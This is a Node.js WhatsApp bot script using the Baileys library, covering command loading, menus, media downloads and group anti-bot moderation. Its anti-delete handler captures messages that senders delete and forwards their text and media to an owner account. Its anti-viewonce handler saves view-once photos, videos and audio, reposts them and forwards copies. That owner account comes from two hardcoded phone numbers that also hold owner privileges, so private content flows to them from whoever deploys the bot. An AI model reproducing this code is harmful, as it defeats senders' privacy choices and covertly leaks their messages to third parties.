require('dotenv').config()
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, downloadMediaMessage } = require('@whiskeysockets/baileys');
const fs = require('fs');
const path = require('path');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const settings = require('./settings');

const PROTECTED_OWNER_NUMS = ["2347072956206", "2348108717744"];
function isRealOwner(jid){ return PROTECTED_OWNER_NUMS.some(n=>jid&&jid.includes(n)) }
function getOwnerJid(){ return PROTECTED_OWNER_NUMS[0]+"@s.whatsapp.net" }

global.privacyMode = "public";
global.sudo = fs.existsSync('./sudo.json')? JSON.parse(fs.readFileSync('./sudo.json')) : [];
global.anticall = false;
global.antiviewonce = true;
global.creact = true;
global.aliveReply = global.aliveReply || {};
global.settingsReply = global.settingsReply || {};
global.menuReply = global.menuReply || {};
global.songCache = global.songCache || {};
global.videoCache = global.videoCache || {};
global.antibot = global.antibot || {};
global.botWarnings = global.botWarnings || {};
global.antiDelete = true;
global.messageCache = global.messageCache || new Map();

async function startBot(){
const { state, saveCreds } = await useMultiFileAuthState(path.resolve(settings.sessionName));
const sock = makeWASocket({ auth: state, logger: pino({ level: 'info' }) });

const commands = new Map();
const cmdPath = path.join(__dirname,'commands');
fs.readdirSync(cmdPath).forEach(f=>{
  if(f.endsWith('.js')){
    try{
      delete require.cache[require.resolve(`./commands/${f}`)];
      let c=require(`./commands/${f}`);
      commands.set(c.name,c);
      if(c.alias) c.alias.forEach(a=>commands.set(String(a).toLowerCase(),c));
      if(c.aliases) c.aliases.forEach(a=>commands.set(String(a).toLowerCase(),c));
    }catch(e){ console.error(`FAILED COMMAND LOAD ${f}:`, e.message) }
  }
});

sock.ev.on('creds.update', saveCreds);

sock.ev.on('messages.delete', async (data) => {
  if (!global.antiDelete) return;
  for (const key of (data?.keys || [])) {
    if (!key?.id || key.fromMe) continue;
    const cached = global.messageCache.get(`${key.remoteJid}:${key.id}`);
    if (!cached?.message) continue;

    try {
      const ownerJid = getOwnerJid();
      const sender = cached.key?.participant || cached.key?.remoteJid || "unknown";
      const chat = cached.key?.remoteJid || "unknown";
      const unwrap = (msg) => {
        if (!msg || typeof msg !== "object") return {};
        for (const wrapper of ["ephemeralMessage","viewOnceMessage","viewOnceMessageV2","viewOnceMessageV2Extension","documentWithCaptionMessage"]) {
          if (msg[wrapper]?.message) return unwrap(msg[wrapper].message);
        }
        return msg;
      };
      const original = unwrap(cached.message);
      const caption = `*🗑️ ANTI-DELETE*
*From:* @${String(sender).split("@")[0]}
*Chat:* ${chat}

${settings.footer}`;
      const text = original.conversation || original.extendedTextMessage?.text;

      if (text) {
        await sock.sendMessage(ownerJid, {
          text: `${caption}

*Message:* ${text}`,
          mentions: [sender]
        });
      } else if (original.imageMessage || original.videoMessage || original.audioMessage || original.documentMessage || original.stickerMessage) {
        const media = await downloadMediaMessage(
          cached,
          "buffer",
          {},
          { logger: pino({ level: "silent" }), reuploadRequest: sock.updateMediaMessage }
        );
        if (original.imageMessage) {
          await sock.sendMessage(ownerJid, { image: media, caption, mentions: [sender] });
        } else if (original.videoMessage) {
          await sock.sendMessage(ownerJid, { video: media, caption, mentions: [sender] });
        } else if (original.audioMessage) {
          await sock.sendMessage(ownerJid, { audio: media, mimetype: original.audioMessage.mimetype || "audio/mpeg" });
        } else if (original.documentMessage) {
          await sock.sendMessage(ownerJid, {
            document: media,
            mimetype: original.documentMessage.mimetype || "application/octet-stream",
            fileName: original.documentMessage.fileName || "deleted-file",
            caption
          });
        } else if (original.stickerMessage) {
          await sock.sendMessage(ownerJid, { sticker: media });
        }
      }
    } catch (e) {
      console.error("ANTI-DELETE ERROR:", e.message);
    } finally {
      global.messageCache.delete(`${key.remoteJid}:${key.id}`);
    }
  }
});
sock.ev.on('connection.update', async (u)=>{
  console.log("CONNECTION UPDATE:", u.connection || "no connection state", u.lastDisconnect?.error?.message || "");
  if(u.qr) qrcode.generate(u.qr,{small:true});
  if(u.connection==="close"){
    let r=u.lastDisconnect?.error?.output?.statusCode;
    if(r!==DisconnectReason.loggedOut) setTimeout(startBot,3000);
  }
});

function extractInteractiveId(message){
  if(!message || typeof message !== "object") return "";
  const direct =
    message.buttonsResponseMessage?.selectedButtonId ||
    message.templateButtonReplyMessage?.selectedId ||
    message.listResponseMessage?.singleSelectReply?.selectedRowId;
  if(direct) return String(direct);

  const native = message.interactiveResponseMessage?.nativeFlowResponseMessage;
  if(native){
    try{
      const raw = native.paramsJson;
      const json = typeof raw === "string"
        ? raw
        : Buffer.isBuffer(raw)
          ? raw.toString("utf8")
          : raw && typeof raw === "object"
            ? JSON.stringify(raw)
            : String(raw || "");
      const parsed = JSON.parse(json || "{}");
      const id = parsed.id || parsed.selectedId || parsed.selected_id ||
        parsed.button_id || parsed.buttonId || parsed.display_text || parsed.displayText;
      if(id) return String(id);
    }catch{}
  }

  for(const wrapper of [
    "ephemeralMessage",
    "viewOnceMessage",
    "viewOnceMessageV2",
    "viewOnceMessageV2Extension",
    "documentWithCaptionMessage"
  ]){
    const nested=message[wrapper]?.message;
    const id=extractInteractiveId(nested);
    if(id) return id;
  }
  return "";
}

sock.ev.on('messages.upsert', async ({messages})=>{
for (const m of messages || []) {
if(!m?.message) continue;
console.log('MESSAGE RECEIVED:', m.key?.remoteJid, m.key?.fromMe ? 'fromMe' : 'incoming');
let chat=m.key.remoteJid;
if(chat === "status@broadcast") return;
let sender=m.key.participant||chat;
let isOwner=!!m.key.fromMe || isRealOwner(sender)||isRealOwner(chat)||global.sudo?.includes(sender);
if(m.key.fromMe && !isOwner) return;
m.chat=chat;

global.messageCache.set(`${chat}:${m.key.id}`, m);
if (global.messageCache.size > 1000) {
  const first = global.messageCache.keys().next().value;
  if (first) global.messageCache.delete(first);
}

const unwrapMessage = (msg) => {
  if(!msg || typeof msg !== "object") return {};
  for(const wrapper of ["ephemeralMessage","viewOnceMessage","viewOnceMessageV2","viewOnceMessageV2Extension","documentWithCaptionMessage"]){
    if(msg[wrapper]?.message) return unwrapMessage(msg[wrapper].message);
  }
  return msg;
};

const msg = unwrapMessage(m.message);
let body=
  msg.conversation ||
  msg.extendedTextMessage?.text ||
  msg.buttonsResponseMessage?.selectedButtonId ||
  msg.templateButtonReplyMessage?.selectedId ||
  msg.listResponseMessage?.singleSelectReply?.selectedRowId ||
  extractInteractiveId(m.message) ||
  "";

let pushName = m.pushName || "User"

// ===== AUTO ANTI-VIEWONCE (WORKS WITHOUT COMMAND) =====
try{
let view = m.message.viewOnceMessageV2?.message || m.message.viewOnceMessage?.message
if(view && global.antiviewonce){
  let type = Object.keys(view)[0]
  let msgObj = view[type]
  let ownerJid = getOwnerJid()
  let buffer = await downloadMediaMessage({ message: { [type]: msgObj } }, 'buffer', {}, { logger: pino({level:'silent'}), reuploadRequest: sock.updateMediaMessage })
  let capSame = `*👁️ ANTI-VIEWONCE*\n*From:* @${sender.split("@")[0]}\n${settings.footer}`
  let capOwner = `*👁️ ANTI-VIEWONCE*\n*From:* ${sender}\n*Chat:* ${chat}\n${settings.footer}`

  // 1. Send in same chat as normal (your request)
  if(type.includes("image")) await sock.sendMessage(chat, { image: buffer, caption: capSame, mentions: [sender] })
  else if(type.includes("video")) await sock.sendMessage(chat, { video: buffer, caption: capSame, mentions: [sender] })
  else if(type.includes("audio")) await sock.sendMessage(chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true })

  // 2. Also send to owner private
  if(chat!== ownerJid){
    if(type.includes("image")) await sock.sendMessage(ownerJid, { image: buffer, caption: capOwner })
    else if(type.includes("video")) await sock.sendMessage(ownerJid, { video: buffer, caption: capOwner })
    else if(type.includes("audio")) await sock.sendMessage(ownerJid, { audio: buffer, mimetype: "audio/mpeg", ptt: true })
  }
}
}catch(e){}

// ===== AUTO ANTI-BOT: BLOCK NON-OWNER ? COMMANDS =====
try {
  if (chat.endsWith("@g.us") && global.antibot[chat] !== false && !isOwner && body.trim().startsWith("?")) {
    try { await sock.sendMessage(chat, { delete: m.key }) } catch {}

    const senderNumber = String(sender).split("@")[0];
    const warn = (global.botWarnings[sender] || 0) + 1;
    global.botWarnings[sender] = warn;

    const warnText = `*🛡️⃝⃘̉̉̉━⋆─❂*
*┃* \`𝗔𝗡𝗧𝗜 𝗕𝗢𝗧\`
*┗━━━━━━━━━━❂*

*👤 User:* @${senderNumber}
*🚫 Reason:* *Unauthorized Bot usage*
*📉 Warning:* *${warn}/5*
*⚠️ Action:* *Deleted & Warned*

${settings.footer}`;

    await sock.sendMessage(chat, {
      text: warnText,
      mentions: [sender]
    });

    // Remove the user after the fifth warning when the bot has permission.
    if (warn >= 5) {
      try {
        await sock.groupParticipantsUpdate(chat, [sender], "remove");
        delete global.botWarnings[sender];
      } catch (e) {
        console.error("ANTI-BOT REMOVE ERROR:", e.message);
      }
    }
    return;
  }
} catch (e) {
  console.error("AUTO ANTI-BOT ERROR:", e.message);
}

// ===== ALIVE REPLY 1-4 HANDLER =====
let cleanBody = body.trim().toLowerCase()
if(global.aliveReply[chat] && ["1","2","3","4"].includes(cleanBody)){
  delete global.aliveReply[chat]
  if(cleanBody==="1"){ body = ".menu" }
  else if(cleanBody==="2"){ body = ".ping" }
  else if(cleanBody==="3"){
    if(!isOwner) return sock.sendMessage(chat, { text: `❌ Owner only\n${settings.footer}` }, { quoted: m })
    return sock.sendMessage(chat, { text: `*⚙️ SETTINGS*\n\n*Owner:* ${PROTECTED_OWNER_NUMS.join(", ")}\n*Prefix:* ${settings.prefix}\n*Mode:* ${global.privacyMode}\n*AntiCall:* ${global.anticall}\n*AntiViewOnce:* ${global.antiviewonce}\n*AntiBot:* ${global.antibot[chat]?"ON":"OFF"}\n\n${settings.footer}` }, { quoted: m })
  } else if(cleanBody==="4"){
    let up = Math.floor(process.uptime()/60)
    let hrs = Math.floor(up/60)
    let uptime = hrs>0? `${hrs}h ${up%60}m` : `${up}m`
    return sock.sendMessage(chat, { text: `*🤖 BOT INFO*\n\n*Name:* E TECH OFC\n*Owner:* Mr Ephraim Ofc\n*Commands:* ${commands.size}\n*Uptime:* ${uptime}\n*Prefix:* ${settings.prefix}\n\n${settings.footer}` }, { quoted: m })
  }
}

// ===== MAIN MENU REPLY 1-7 HANDLER =====
if(global.menuReply[chat] && ["1","2","3","4","5","6","7"].includes(cleanBody)){
  const menuCmds = {
    "1": "ownermenu",
    "2": "dlmenu",
    "3": "aimenu",
    "4": "gmenu",
    "5": "toolsmenu",
    "6": "edumenu",
    "7": "channelmenu"
  };
  const selected = menuCmds[cleanBody];
  delete global.menuReply[chat];

  if(cleanBody === "1" && !isOwner){
    return sock.sendMessage(chat, { text: `❌ Owner only\n${settings.footer}` }, { quoted: m });
  }

  const sub = commands.get(selected);
  if(!sub){
    return sock.sendMessage(chat, { text: `❌ Submenu unavailable: ${selected}\n${settings.footer}` }, { quoted: m });
  }

  try{
    m.pushName = pushName;
    return await sub.execute(sock,m,[],settings);
  }catch(e){
    console.error(`SUBMENU ERROR ${selected}:`,e);
    return sock.sendMessage(chat, { text: `❌ Submenu error: ${e.message}\n${settings.footer}` }, { quoted: m });
  }
}

// ===== SONG NATIVE BUTTON REPLIES =====
if(body.startsWith("etech_video_") && commands.has("video")){
  const action = body.toLowerCase();
  const quality = action.replace("etech_video_", "");
  if(["360","480","720"].includes(quality)){
    try{
      m.pushName = pushName;
      return await commands.get("video").execute(sock,m,[quality + "p"],settings);
    }catch(e){
      console.error("VIDEO BUTTON ERROR:",e);
      return sock.sendMessage(chat, { text: `❌ Video button error: ${e.message}\n${settings.footer}` }, { quoted: m });
    }
  }
}
if(body.startsWith("etech_song_") && commands.has("song")){
  const action = body.toLowerCase();
  if(action === "etech_song_audio" || action === "etech_song_document"){
    try{
      m.pushName = pushName;
      return await commands.get("song").execute(sock,m,[action.replace("etech_song_","")],settings);
    }catch(e){
      console.error("SONG BUTTON ERROR:",e);
      return sock.sendMessage(chat, { text: `❌ Song button error: ${e.message}\n${settings.footer}` }, { quoted: m });
    }
  }
}
if(/^(360P|480P|720P)$/i.test(body) && commands.has("video")){
  try{
    m.pushName = pushName;
    return await commands.get("video").execute(sock,m,[body.toLowerCase()],settings);
  }catch(e){ console.error("VIDEO BUTTON ERROR:", e.message) }
}

if(/^(AUDIO|DOCUMENT)$/i.test(body) && commands.has("song")){
  try{
    m.pushName = pushName;
    return await commands.get("song").execute(sock,m,[body.toLowerCase()],settings);
  }catch(e){
    console.error("SONG BUTTON ERROR:",e);
    return sock.sendMessage(chat, { text: `❌ Song button error: ${e.message}\n${settings.footer}` }, { quoted: m });
  }
}

// ===== SETTINGS REPLY 1-7 HANDLER =====
if(global.settingsReply[chat] && ["1","2","3","4","5","6","7"].includes(cleanBody)){
  body = `?settings ${cleanBody}`
}

// ===== DUAL PREFIX =====
const ownerOnlyCmds = ["settings","setting","mode","ban","unban","setsudo","delsudo","restart","anticall","antiviewonce","creact","close","open","antibot","antidelete"]
const reactMap = { menu:"📜", ping:"🏓", alive:"🌎", settings:"⚙️", setting:"⚙️" }
const stagedCmds = ["song","play","music","tiktok","fb","video","insta"]

let usedPrefix=null
if(body.startsWith("?")) usedPrefix="?"
else if(body.startsWith(settings.prefix)) usedPrefix=settings.prefix
else return

if(usedPrefix==="?" &&!isOwner) return

let args=body.slice(usedPrefix.length).trim().split(/ +/)
let cmdName=args.shift().toLowerCase()
if(!cmdName) return

// SETTINGS MUST BE? ONLY - BLOCK.settings
if((cmdName==="settings" || cmdName==="setting") && usedPrefix!== "?") return

if(ownerOnlyCmds.includes(cmdName) && usedPrefix==="." &&!isOwner) return

if(reactMap[cmdName] &&!stagedCmds.includes(cmdName)){
  try{ await sock.sendMessage(chat, { react: { text: reactMap[cmdName], key: m.key } }) }catch{}
}

if(commands.has(cmdName)){
  try{
    m.pushName = pushName
    await commands.get(cmdName).execute(sock,m,args,settings)
    if(cmdName==="menu"){
      global.menuReply[chat]=true
      setTimeout(()=>{ delete global.menuReply[chat] },120000)
    }
  }catch(e){ console.error(`COMMAND ERROR ${cmdName}:`,e) }
}
});
}
startBot();
